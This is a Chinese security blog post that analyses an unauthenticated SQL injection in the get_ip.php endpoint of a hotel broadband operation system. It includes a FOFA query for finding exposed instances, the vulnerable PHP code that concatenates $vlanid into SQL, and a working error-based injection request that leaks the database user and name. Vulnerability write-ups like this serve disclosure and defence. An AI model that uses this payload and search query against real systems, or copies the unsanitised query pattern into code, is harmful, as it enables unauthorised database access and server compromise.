---
title: "安美数字酒店宽带运营系统 get_ip.php SQL注入漏洞"
source: https://mrxn.net/jswz/amttgroup-user-get_ip-vlanid-sqli.html
asset_dir: assets/安美数字酒店宽带运营系统-get_ip.php-sql注入漏洞
---

# 安美数字酒店宽带运营系统 get\_ip.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/16 08:31
- 752浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

SQL

身份验证

软件

---

# 漏洞简介

安美数字酒店宽带运营系统的 get\_ip.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中的信息之外，甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> `body="http://www.amttgroup.com/" && body="form.ManagerID.focus()"`

# 漏洞分析

user/get\_ip.php 业务逻辑如下

```
if (trim($gwip) == "" || trim($realip) == "") {
    echo "<script language=\"javascript\">\n";
    echo "alert(\"{$lang['prompt_invalid_req_opt']}\");\n";
    echo "</script>\n";
    exit;
}

$user_switch_stat = 2;
$vlanid = trim($vlanid);
if ($vlanid != "") {
    $db = new newDB();
    $sqlcmd  = "select SwitchIP, SwitchPort ";
    $sqlcmd .= "from T_Account where BindVlan='$vlanid' or AccountID='$vlanid'";
    if (($result = $db->query($sqlcmd)) == FALSE) {
       $user_switch_stat = 0;
    }
```

深入探索

文本剥离工具

安全研究工具

服务器安全服务

只需要 `$gwip` 和 `$realip` 不为空即可满足条件

漏洞扫描服务

`$vlanid` 没有任何过滤校验操作，直接拼接进SQL语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
GET /user/get_ip.php?vlanid=1'+and+extractvalue(1,concat(0x7e,user(),0x7e,database()))--+-&gwip=0&realip=0 HTTP/1.1
Host: amttgroup.mrxn.net
```

[![安美数字酒店宽带运营系统 get_ip.php SQL注入漏洞](images/img-001-b81ed96fba92.webp)](https://image.mrxn.net/1a03cd2c86744d3b919bae77da0244f1.webp)

通过报错注入成功在响应回显数据库用户和数据库名。

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
